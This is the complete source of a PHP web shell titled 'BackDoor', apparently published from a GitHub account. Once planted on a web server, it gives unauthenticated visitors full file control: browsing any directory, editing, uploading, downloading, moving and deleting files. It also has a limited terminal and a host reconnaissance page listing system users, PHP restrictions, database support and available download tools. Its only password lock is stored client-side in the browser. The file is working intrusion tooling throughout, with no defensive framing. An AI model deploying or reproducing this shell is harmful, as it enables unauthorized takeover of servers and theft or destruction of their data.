<?php
#++++++++++++++++++++++ https://github.com/ERRORIP ++++++++++++++++++++++#
if(isset($_GET['tcmd'])){
    $_c = trim($_GET['tcmd']);
    if($_c === 'ls'){
        $_f = scandir(getcwd());
        $_o = "";
        foreach($_f as $_v){
            if($_v === "." || $_v === "..") continue;
            $_o .= $_v."\n";
        }
        echo nl2br($_o);
    } elseif($_c === 'pwd'){
        echo getcwd();
    } else {
        echo "Command not recognized.";
    }
    exit;
}
$_p = isset($_GET['page']) ? $_GET['page'] : 'home';
$_d = isset($_GET['dir']) ? $_GET['dir'] : getcwd();
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>BackDoor</title>
<link href="https://fonts.googleapis.com/css?family=Roboto:400,500,700&display=swap" rel="stylesheet">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.5/codemirror.min.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.5/theme/default.min.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/xterm/4.19.0/xterm.min.css">
<style>
* { margin:0; padding:0; box-sizing:border-box; }
body { font-family:"Roboto", sans-serif; background:#121212; color:#e0e0e0; }
#header { background:#1e1e1e; padding:15px 20px; display:flex; justify-content:space-between; align-items:center; border-bottom:1px solid #333; }
#header h1 { font-size:1.8em; }
#nav a { color:#e0e0e0; margin-left:20px; text-decoration:none; font-weight:500; transition:color .3s; }
#nav a:hover { color:#4da6ff; }
#container { max-width:1200px; margin:20px auto; background:#1e1e1e; padding:30px; border-radius:8px; box-shadow:0 4px 12px rgba(0,0,0,0.7); animation:fadeIn 1s; }
h2, h3 { text-align:center; margin-bottom:20px; }
p { margin-bottom:20px; }
.breadcrumb { margin-bottom:20px; padding:10px; background:#2a2a2a; border-radius:5px; display:inline-block; }
.breadcrumb-item a { color:#4da6ff; text-decoration:none; padding:4px 8px; background:#1e1e1e; border-radius:3px; }
.breadcrumb-item a:hover { background:#333; }
.breadcrumb-separator { margin:0 5px; color:#e0e0e0; }
#back { margin:10px 0; display:inline-block; color:#fff; background:#ff4d4d; padding:8px 12px; border-radius:5px; text-decoration:none; }
#back:hover { background:#ff1a1a; }
.file-list { list-style:none; padding:0; }
.file-list li { 
    display: flex;
    align-items: center;
    justify-content: space-between;
    background: #2a2a2a;
    margin-bottom: 8px;
    padding: 8px 12px;
    border-radius: 5px;
    transition: background .3s, transform .3s;
    cursor: pointer;
}
.file-list li:hover { background: #333; transform: translateX(5px); }
.file-info { display: flex; flex-direction: column; }
.fn { font-weight: bold; }
.details { font-size: 0.8em; color: #aaa; }
.dd { position: relative; }
.ddb { background: transparent; border: none; color: #e0e0e0; font-size: 1.2em; cursor: pointer; }
.ddc { display: none; position: absolute; right: 0; background: #2a2a2a; min-width: 140px; border-radius: 5px; box-shadow: 0 8px 16px rgba(0,0,0,0.3); z-index: 9999; }
.ddc a { color: #e0e0e0; padding: 8px 12px; text-decoration: none; display: block; transition: background .3s; }
.ddc a:hover { background: #444; }
.dd.open .ddc { display: block; }
form { margin-top:20px; display:flex; flex-direction:column; gap:15px; }
input[type="text"], input[type="file"], textarea { width:100%; padding:12px; border: none; border-radius:5px; background:#333; color:#e0e0e0; font-size:1em; outline:none; transition:background .3s; }
input[type="text"]:focus, input[type="file"]:focus, textarea:focus { background:#444; }
input[type="submit"], button { padding:12px; border: none; border-radius:5px; background:#4da6ff; color:#fff; font-size:1em; font-weight:bold; cursor:pointer; transition:background .3s, transform .3s; }
input[type="submit"]:hover, button:hover { background:#80c1ff; transform: scale(1.05); }
hr { border: 0; height: 1px; background: #555; margin:30px 0; }
.CodeMirror { height: auto; border: 1px solid #444; font-size: 1em; background: #2a2a2a; color: #e0e0e0; }
#terminal-container { margin-top:40px; border:1px solid #444; border-radius:5px; padding:10px; }
.info-box { background: #222; padding: 20px; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.7); }
.info-box table { width:100%; border-collapse:collapse; }
.info-box th, .info-box td { padding: 10px; border: 1px solid #444; text-align: left; }
.info-box th { background: #333; color: #4da6ff; }
.modal-overlay {
  position: fixed;
  top:0; left:0; width:100%; height:100%;
  background: rgba(0,0,0,0.8);
  display: none;
  align-items: center;
  justify-content: center;
  z-index: 10000;
}
.modal {
  background: #1e1e1e;
  padding: 20px;
  border-radius: 8px;
  width: 300px;
  text-align: center;
}
.modal input[type="password"] {
  width: 100%;
  padding: 8px;
  margin: 8px 0;
  border: 1px solid #444;
  border-radius: 4px;
  background: #333;
  color: #e0e0e0;
}
.modal button { margin-top: 10px; }
@keyframes fadeIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
</style>
<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.5/codemirror.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.5/mode/php/php.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/xterm/4.19.0/xterm.min.js"></script>
<script>
function folderOpen(url, event) {
    if(event.target.closest('.dd')) return;
    window.location.href = "?dir=" + url;
}
document.addEventListener("DOMContentLoaded", function(){
    if(localStorage.getItem("locked") === "true" && localStorage.getItem("lockPassword")){
        showEnterLockModal();
    }
    updateLockToggle();
});
function updateLockToggle(){
    var lockToggle = document.getElementById("lockToggle");
    if(localStorage.getItem("locked") === "true"){
        lockToggle.textContent = "Lock On";
    } else {
        lockToggle.textContent = "Lock Off";
    }
}
function showSetLockModal(){
    document.getElementById("setLockModal").style.display = "flex";
}
function hideSetLockModal(){
    document.getElementById("setLockModal").style.display = "none";
}
function showEnterLockModal(){
    document.getElementById("enterLockModal").style.display = "flex";
}
function hideEnterLockModal(){
    document.getElementById("enterLockModal").style.display = "none";
}
function toggleLock(){
    if(localStorage.getItem("locked") === "true"){
        localStorage.removeItem("locked");
        localStorage.removeItem("lockPassword");
        updateLockToggle();
        alert("Lock disabled.");
    } else {
        showSetLockModal();
    }
}
function setLock(){
    var pass = document.getElementById("lockPass").value;
    var rep = document.getElementById("lockPassRep").value;
    if(pass === "" || rep === ""){
        alert("Both fields are required.");
        return;
    }
    if(pass !== rep){
        alert("Passwords do not match.");
        return;
    }
    localStorage.setItem("lockPassword", pass);
    localStorage.setItem("locked", "true");
    updateLockToggle();
    hideSetLockModal();
    showEnterLockModal();
}
function enterLock(){
    var input = document.getElementById("enterLockInput").value;
    if(input === localStorage.getItem("lockPassword")){
        hideEnterLockModal();
    } else {
        document.getElementById("enterLockError").textContent = "Incorrect password.";
    }
}
function td(e,ev){
  ev.stopPropagation();
  var d = e.parentElement;
  document.querySelectorAll(".dd").forEach(function(dd){
    if(dd!==d) dd.classList.remove("open");
  });
  d.classList.toggle("open");
}
document.addEventListener("click", function(){
  document.querySelectorAll(".dd").forEach(function(d){
    d.classList.remove("open");
  });
});
</script>
</head>
<body>
<div id="header">
  <h1>BackDoor</h1>
  <div id="nav">
    <a href="?page=home&dir=<?php echo urlencode($_d); ?>">File Manager</a>
    <a href="?page=upload&dir=<?php echo urlencode($_d); ?>">Upload File</a>
    <a href="?page=terminal&dir=<?php echo urlencode($_d); ?>">Terminal</a>
    <a href="?page=info&dir=<?php echo urlencode($_d); ?>">Info</a>
    <a href="javascript:void(0)" id="lockToggle" onclick="toggleLock()">Lock Off</a>
  </div>
</div>
<div id="container">
<?php
function g1($x){ return htmlspecialchars(strip_tags($x)); }
function g2($x){
    $x = str_replace("\\", "/", $x);
    $parts = array_filter(explode("/", $x), 'strlen');
    $r = '<div class="breadcrumb"><span class="breadcrumb-item"><a href="?dir=/">/</a></span>';
    $currentPath = "";
    foreach($parts as $part){
       $currentPath .= "/" . $part;
       $r .= '<span class="breadcrumb-separator">/</span><span class="breadcrumb-item"><a href="?dir='.urlencode($currentPath).'">'.$part.'</a></span>';
    }
    $r .= '</div>';
    return $r;
}
function g3($x){
  $f = scandir($x);
  $fh = array();
  $ff = array();
  foreach($f as $v){
    if($v=="." || $v=="..") continue;
    $p = $x."/".$v;
    $modify = date("Y-m-d H:i:s", filemtime($p));
    $owner = function_exists('posix_getpwuid') ? posix_getpwuid(fileowner($p))['name'] : fileowner($p);
    $group = function_exists('posix_getgrgid') ? posix_getgrgid(filegroup($p))['name'] : filegroup($p);
    $perms = substr(sprintf('%o', fileperms($p)), -4);
    if(is_dir($p)){
      $details = '<div class="details">Size: - | Modify: '.$modify.' | Owner/Group: '.$owner.'/'.$group.' | Perms: '.$perms.'</div>';
      $fh[] = '<li>
                  <div class="file-info" onclick="folderOpen(\''.urlencode($p).'\', event)">
                    <span class="fn">'.$v.'</span>
                    '.$details.'
                  </div>
                  <div class="dd">
                    <button class="ddb" onclick="td(this,event)">&#8942;</button>
                    <div class="ddc">
                      <a href="?action=view&file='.urlencode($v).'&dir='.urlencode($x).'">View</a>
                      <a href="?action=move&file='.urlencode($v).'&dir='.urlencode($x).'">Move</a>
                      <a href="?action=rename&file='.urlencode($v).'&dir='.urlencode($x).'">Rename</a>
                      <a href="?action=compress&file='.urlencode($v).'&dir='.urlencode($x).'">Compress</a>
                      <a href="?action=delete&file='.urlencode($v).'&dir='.urlencode($x).'">Delete</a>
                    </div>
                  </div>
                </li>';
    } else {
      $s = filesize($p);
      $u = ['B','KB','MB','GB','TB'];
      $w = $s>0 ? floor(log($s,1024)) : 0;
      $rs = $s ? round($s/pow(1024,$w),2)." ".$u[$w] : "0 B";
      $details = '<div class="details">Size: '.$rs.' | Modify: '.$modify.' | Owner/Group: '.$owner.'/'.$group.' | Perms: '.$perms.'</div>';
      $ff[] = '<li>
                  <div class="file-info">
                    <span class="fn" onclick="location.href=\'?action=edit&file='.urlencode($v).'&dir='.urlencode($x).'\'">'.$v.'</span>
                    '.$details.'
                  </div>
                  <div class="dd">
                    <button class="ddb" onclick="td(this,event)">&#8942;</button>
                    <div class="ddc">
                      <a href="?action=view&file='.urlencode($v).'&dir='.urlencode($x).'">View</a>
                      <a href="?action=edit&file='.urlencode($v).'&dir='.urlencode($x).'">Edit</a>
                      <a href="?action=move&file='.urlencode($v).'&dir='.urlencode($x).'">Move</a>
                      <a href="?action=download&file='.urlencode($v).'&dir='.urlencode($x).'">Download</a>
                      <a href="?action=rename&file='.urlencode($v).'&dir='.urlencode($x).'">Rename</a>
                      <a href="?action=compress&file='.urlencode($v).'&dir='.urlencode($x).'">Compress</a>
                      <a href="?action=delete&file='.urlencode($v).'&dir='.urlencode($x).'" onclick="return confirm(\'Sure?\');">Delete</a>
                    </div>
                  </div>
                </li>';
    }
  }
  echo '<ul class="file-list">'.implode("", $fh).(count($fh)&&count($ff) ? '<hr>' : '').implode("", $ff).'</ul>';
}
function g4($x,$n){
  $n = g1($n);
  $p = $x."/".$n;
  if(!file_exists($p)){
    mkdir($p);
    echo "<p style=\"color:#4da6ff;text-align:center;\">Folder '$n' created.</p>";
  } else {
    echo "<p style=\"color:#ff4d4d;text-align:center;\">Folder '$n' exists.</p>";
  }
}
function g5($x,$f){
  if(!is_dir($x)){
      echo "<p style=\"color:#ff4d4d;text-align:center;\">Directory does not exist.</p>";
      return;
  }
  $t = $x."/".basename($f['name']);
  if(move_uploaded_file($f['tmp_name'],$t)){
    echo "<p style=\"color:#4da6ff;text-align:center;\">File ".g1(basename($f['name']))." uploaded.</p>";
  } else {
    echo "<p style=\"color:#ff4d4d;text-align:center;\">Upload error.</p>";
  }
}
function g6($p){
  if($_SERVER['REQUEST_METHOD']==='POST'){
    $c = stripslashes($_POST['file_content']);
    if(file_put_contents($p,$c)!==false){
      echo "<p style=\"color:#4da6ff;text-align:center;\">Saved.</p>";
    } else {
      echo "<p style=\"color:#ff4d4d;text-align:center;\">Save error.</p>";
    }
  }
  $c = file_get_contents($p);
  echo '<form method="post"><textarea id="codeEditor" name="file_content" rows="10" cols="50">'.htmlspecialchars($c).'</textarea><br><input type="submit" value="Save"></form><br><button onclick="if(confirm(\'Sure?\')){location.href=\'?action=delete&file='.urlencode(basename($p)).'&dir='.urlencode(dirname($p)).'\'}">Delete</button>';
}
if(isset($_GET['action'])){
  $_a = $_GET['action'];
  switch($_a){
    case 'edit':
      if(isset($_GET['file'])){
        $x = stripslashes($_GET['file']);
        $p = $_d."/".$x;
        if(file_exists($p)){
          echo "<h2>Edit: $x</h2><a id=\"back\" href=\"?dir=".urlencode($_d)."\">Back</a>";
          g6($p);
        } else {
          echo "<p style=\"color:#ff4d4d;text-align:center;\">Not found.</p><a id=\"back\" href=\"?dir=".urlencode($_d)."\">Back</a>";
        }
      } else {
        echo "<p style=\"color:#ff4d4d;text-align:center;\">Invalid.</p><a id=\"back\" href=\"?dir=".urlencode($_d)."\">Back</a>";
      }
      break;
    case 'view':
      if(isset($_GET['file'])){
        $x = stripslashes($_GET['file']);
        $p = $_d."/".$x;
        if(file_exists($p)){
          echo "<h2>View: $x</h2><a id=\"back\" href=\"?dir=".urlencode($_d)."\">Back</a>";
          echo "<pre style=\"background:#2e2e2e;padding:15px;border-radius:5px;\">".htmlspecialchars(file_get_contents($p))."</pre>";
        } else {
          echo "<p style=\"color:#ff4d4d;text-align:center;\">Not found.</p><a id=\"back\" href=\"?dir=".urlencode($_d)."\">Back</a>";
        }
      } else {
        echo "<p style=\"color:#ff4d4d;text-align:center;\">Invalid.</p><a id=\"back\" href=\"?dir=".urlencode($_d)."\">Back</a>";
      }
      break;
    case 'delete':
      if(isset($_GET['file'])){
        $x = stripslashes($_GET['file']);
        $p = $_d."/".$x;
        if(file_exists($p)){
          if(unlink($p)){
            echo "<p style=\"color:#4da6ff;text-align:center;\">Deleted.</p><a id=\"back\" href=\"?dir=".urlencode($_d)."\">Back</a>";
          } else {
            echo "<p style=\"color:#ff4d4d;text-align:center;\">Delete error.</p><a id=\"back\" href=\"?dir=".urlencode($_d)."\">Back</a>";
          }
        } else {
          echo "<p style=\"color:#ff4d4d;text-align:center;\">Not found.</p><a id=\"back\" href=\"?dir=".urlencode($_d)."\">Back</a>";
        }
      } else {
        echo "<p style=\"color:#ff4d4d;text-align:center;\">Invalid.</p><a id=\"back\" href=\"?dir=".urlencode($_d)."\">Back</a>";
      }
      break;
    case 'download':
      if(isset($_GET['file'])){
        $x = stripslashes($_GET['file']);
        $p = $_d."/".$x;
        if(file_exists($p)){
            if(ob_get_level()){
                ob_end_clean();
            }
            header("Content-Description: File Transfer");
            header("Content-Type: application/force-download");
            header("Content-Disposition: attachment; filename=\"".basename($p)."\"");
            header("Content-Transfer-Encoding: binary");
            header("Content-Length: " . filesize($p));
            header("Cache-Control: must-revalidate, post-check=0, pre-check=0");
            header("Expires: 0");
            header("Pragma: public");
            header("X-Content-Type-Options: nosniff");
            $fp = fopen($p, "rb");
            if($fp){
                while(!feof($fp)){
                    print fread($fp, 8192);
                    flush();
                }
                fclose($fp);
            }
            exit;
        } else {
          echo "<p style=\"color:#ff4d4d;text-align:center;\">Not found.</p><a id=\"back\" href=\"?dir=".urlencode($_d)."\">Back</a>";
        }
      } else {
        echo "<p style=\"color:#ff4d4d;text-align:center;\">Invalid.</p><a id=\"back\" href=\"?dir=".urlencode($_d)."\">Back</a>";
      }
      break;
    case 'rename':
      if(isset($_GET['file'])){
        $x = stripslashes($_GET['file']);
        echo "<h2>Rename: $x</h2><a id=\"back\" href=\"?dir=".urlencode($_d)."\">Back</a>";
        echo '<form method="post">New Name: <input type="text" name="new_name" required><input type="submit" name="rn" value="Rename"></form>';
        if(isset($_POST['rn'])){
          $nn = g1($_POST['new_name']);
          $op = $_d."/".$x;
          $np = $_d."/".$nn;
          if(rename($op,$np)){
            echo "<p style=\"color:#4da6ff;text-align:center;\">Renamed.</p><a id=\"back\" href=\"?dir=".urlencode($_d)."\">Back</a>";
          } else {
            echo "<p style=\"color:#ff4d4d;text-align:center;\">Rename error.</p><a id=\"back\" href=\"?dir=".urlencode($_d)."\">Back</a>";
          }
        }
      } else {
        echo "<p style=\"color:#ff4d4d;text-align:center;\">Invalid.</p><a id=\"back\" href=\"?dir=".urlencode($_d)."\">Back</a>";
      }
      break;
    case 'move':
      if(isset($_GET['file'])){
        $x = stripslashes($_GET['file']);
        echo "<h2>Move: $x</h2><a id=\"back\" href=\"?dir=".urlencode($_d)."\">Back</a>";
        echo '<form method="post">Target Dir: <input type="text" name="target_dir" value="'.htmlspecialchars($_d).'" required><input type="submit" name="mv" value="Move"></form>';
        if(isset($_POST['mv'])){
          $td = g1($_POST['target_dir']);
          $op = $_d."/".$x;
          $np = $td."/".$x;
          if(rename($op,$np)){
            echo "<p style=\"color:#4da6ff;text-align:center;\">Moved.</p><a id=\"back\" href=\"?dir=".urlencode($_d)."\">Back</a>";
          } else {
            echo "<p style=\"color:#ff4d4d;text-align:center;\">Move error.</p><a id=\"back\" href=\"?dir=".urlencode($_d)."\">Back</a>";
          }
        }
      } else {
        echo "<p style=\"color:#ff4d4d;text-align:center;\">Invalid.</p><a id=\"back\" href=\"?dir=".urlencode($_d)."\">Back</a>";
      }
      break;
    case 'compress':
      if(isset($_GET['file'])){
        $x = stripslashes($_GET['file']);
        $p = $_d."/".$x;
        $z = $_d."/".$x.".zip";
        $za = new ZipArchive;
        if($za->open($z,ZipArchive::CREATE)===TRUE){
          $za->addFile($p,$x);
          $za->close();
          echo "<p style=\"color:#4da6ff;text-align:center;\">Compressed.</p><a id=\"back\" href=\"?dir=".urlencode($_d)."\">Back</a>";
        } else {
          echo "<p style=\"color:#ff4d4d;text-align:center;\">Compress error.</p><a id=\"back\" href=\"?dir=".urlencode($_d)."\">Back</a>";
        }
      } else {
        echo "<p style=\"color:#ff4d4d;text-align:center;\">Invalid.</p><a id=\"back\" href=\"?dir=".urlencode($_d)."\">Back</a>";
      }
      break;
    default:
      echo "<p style=\"color:#ff4d4d;text-align:center;\">Invalid action.</p><a id=\"back\" href=\"?dir=".urlencode($_d)."\">Back</a>";
  }
} else {
  if($_p==='upload'){
    echo "<h2>Upload File</h2><a id=\"back\" href=\"?dir=".urlencode($_d)."\">Back</a>";
    echo '<form action="" method="post" enctype="multipart/form-data">Select file: <input type="file" name="file_to_upload"><br>Target: ';
    if($_d==getcwd()){
        echo '<select name="target_dir"><option value="'.$_d.'">'.$_d.'</option>';
        function g7($x){
          $d = scandir($x);
          $r = "";
          foreach($d as $v){
            if($v=="." || $v=="..") continue;
            if(is_dir($x."/".$v)){
              $r .= '<option value="'.$x."/".$v.'">'.$v.'</option>';
            }
          }
          return $r;
        }
        echo g7($_d);
        echo '</select>';
    } else {
        echo '<input type="text" name="target_dir" value="'.htmlspecialchars($_d).'" placeholder="Enter target directory">';
    }
    echo '<br><input type="submit" name="upload_file" value="Upload"></form>';
    if(isset($_POST['upload_file'])){
      $td = g1($_POST['target_dir']);
      g5($td,$_FILES['file_to_upload']);
    }
  } elseif($_p==='terminal'){
    echo "<h2>Terminal</h2><a id=\"back\" href=\"?dir=".urlencode($_d)."\">Back</a>";
    echo '<div id="terminal-container"><div id="terminal"></div><br><input type="text" id="termInput" placeholder="Enter command" style="width:100%;padding:10px;border:none;border-radius:5px;background:#333;color:#e0e0e0;"></div>';
  } elseif($_p==='info'){
    $uname = php_uname();
    $uid = function_exists('posix_getuid') ? posix_getuid() : 'N/A';
    $user_info = function_exists('posix_getpwuid') ? posix_getpwuid(posix_getuid()) : array();
    $username = isset($user_info['name']) ? $user_info['name'] : 'N/A';
    $gid = function_exists('posix_getgid') ? posix_getgid() : 'N/A';
    $group_info = function_exists('posix_getgrgid') ? posix_getgrgid(posix_getgid()) : array();
    $groupname = isset($group_info['name']) ? $group_info['name'] : 'N/A';
    $php_version = phpversion();
    $safe_mode = ini_get('safe_mode') ? 'ON' : 'OFF';
    $server_ip = $_SERVER['SERVER_ADDR'] ?? 'N/A';
    $remote_ip = $_SERVER['REMOTE_ADDR'] ?? 'N/A';
    $date_time = date('Y-m-d H:i:s');
    $domains = "Cant Read [ /etc/named.conf ]";
    $hdd_total = disk_total_space($_SERVER['DOCUMENT_ROOT']?? __DIR__);
    $hdd_free = disk_free_space($_SERVER['DOCUMENT_ROOT']?? __DIR__);
    $hdd_total_gb = round($hdd_total/(1024*1024*1024),2)." GB";
    $hdd_free_gb = round($hdd_free/(1024*1024*1024),2)." GB";
    $hdd_percent = $hdd_total>0 ? round(($hdd_free/$hdd_total)*100) : 0;
    $useful = "gccccldmakephpperlrubytargzip";
    $downloader = (function_exists('curl_init') ? "curl" : "").((function_exists('shell_exec') && stripos(shell_exec("which wget"),"wget")!==false) ? "|wget" : "");
    $downloader = $downloader ? $downloader : "None";
    $disable_functions = ini_get('disable_functions');
    $curl = extension_loaded('curl') ? 'ON' : 'OFF';
    $ssh2 = extension_loaded('ssh2') ? 'ON' : 'OFF';
    $magic_quotes = (function_exists('get_magic_quotes_gpc') && get_magic_quotes_gpc()) ? 'ON' : 'OFF';
    $mysql = function_exists('mysql_connect') ? 'ON' : 'OFF';
    $mssql = function_exists('mssql_connect') ? 'ON' : 'OFF';
    $postgresql = function_exists('pg_connect') ? 'ON' : 'OFF';
    $oracle = function_exists('oci_connect') ? 'ON' : 'OFF';
    $cgi_status = "ON";
    $software = $_SERVER['SERVER_SOFTWARE'] ?? 'N/A';
    $pwd = getcwd();
    echo "<h2>Host Information</h2><a id=\"back\" href=\"?dir=".urlencode($_d)."\">Back</a>";
    echo '<div class="info-box"><table>';
    echo "<tr><th>Uname</th><td>$uname</td></tr>";
    echo "<tr><th>User</th><td>$uid [ $username ] Group: $gid [ $groupname ]</td></tr>";
    echo "<tr><th>PHP</th><td>$php_version Safe Mode: $safe_mode</td></tr>";
    echo "<tr><th>ServerIP</th><td>$server_ip The Netherlands Your IP: $remote_ip</td></tr>";
    echo "<tr><th>DateTime</th><td>$date_time</td></tr>";
    echo "<tr><th>Domains</th><td>$domains</td></tr>";
    echo "<tr><th>HDD</th><td>Total: $hdd_total_gb Free: $hdd_free_gb [$hdd_percent%]</td></tr>";
    echo "<tr><th>Useful</th><td>$useful</td></tr>";
    echo "<tr><th>Downloader</th><td>$downloader</td></tr>";
    echo "<tr><th>Disable Functions</th><td>$disable_functions</td></tr>";
    echo "<tr><th>CURL</th><td>$curl</td></tr>";
    echo "<tr><th>SSH2</th><td>$ssh2</td></tr>";
    echo "<tr><th>Magic Quotes</th><td>$magic_quotes</td></tr>";
    echo "<tr><th>MySQL</th><td>$mysql</td></tr>";
    echo "<tr><th>MSSQL</th><td>$mssql</td></tr>";
    echo "<tr><th>PostgreSQL</th><td>$postgresql</td></tr>";
    echo "<tr><th>Oracle</th><td>$oracle</td></tr>";
    echo "<tr><th>CGI</th><td>$cgi_status</td></tr>";
    echo "<tr><th>Open_basedir</th><td>".ini_get('open_basedir')."</td></tr>";
    echo "<tr><th>Safe_mode_exec_dir</th><td>".ini_get('safe_mode_exec_dir')."</td></tr>";
    echo "<tr><th>Safe_mode_include_dir</th><td>".ini_get('safe_mode_include_dir')."</td></tr>";
    echo "<tr><th>SoftWare</th><td>$software</td></tr>";
    echo "<tr><th>PWD</th><td>$pwd [ Home Shell ]</td></tr>";
    echo "</table></div>";
  } else {
    echo "<h2>Directory: ".$_d."</h2>";
    echo g2($_d);
    $pd = dirname($_d);
    echo '<a id="back" href="?dir='.urlencode($pd).'">Back</a>';
    echo "<h3>Folder:</h3>";
    g3($_d);
    echo '<hr><h3>Create New Folder:</h3><form action="" method="post">New Folder: <input type="text" name="folder_name"><input type="submit" name="create_folder" value="Create"></form>';
    if(isset($_POST['create_folder'])){
      g4($_d,$_POST['folder_name']);
    }
  }
}
?>
</div>
<!-- Set Lock Modal -->
<div id="setLockModal" class="modal-overlay">
  <div class="modal">
    <h3>Set Lock Password</h3>
    <input type="password" id="lockPass" placeholder="Password">
    <input type="password" id="lockPassRep" placeholder="Repeat Password">
    <button onclick="setLock()">Set Password</button>
  </div>
</div>
<!-- Enter Lock Modal -->
<div id="enterLockModal" class="modal-overlay">
  <div class="modal">
    <h3>Enter Password</h3>
    <input type="password" id="enterLockInput" placeholder="Password">
    <div id="enterLockError" style="color:red;"></div>
    <button onclick="enterLock()">Enter</button>
  </div>
</div>
<script>
if(document.getElementById("codeEditor")){
  var ed = CodeMirror.fromTextArea(document.getElementById("codeEditor"),{
    lineNumbers:true,
    mode:"text/plain",
    theme:"default"
  });
}
if(document.getElementById("termInput")){
  document.getElementById("termInput").addEventListener("keydown",function(e){
    if(e.keyCode===13){
      var cmd = this.value;
      fetch("?tcmd="+encodeURIComponent(cmd))
      .then(r => r.text())
      .then(d => {
        document.getElementById("terminal").innerHTML += "<br>" + d + "<br>$ ";
      })
      .catch(err => {
        document.getElementById("terminal").innerHTML += "<br>Error<br>$ ";
      });
      this.value = "";
    }
  });
  var term = new Terminal({
    cursorBlink:true,
    theme:{background:"#1e1e1e", foreground:"#e0e0e0"}
  });
  term.open(document.getElementById("terminal"));
  term.write("Welcome to the Terminal\r\n$ ");
}
</script>
</body>
</html>
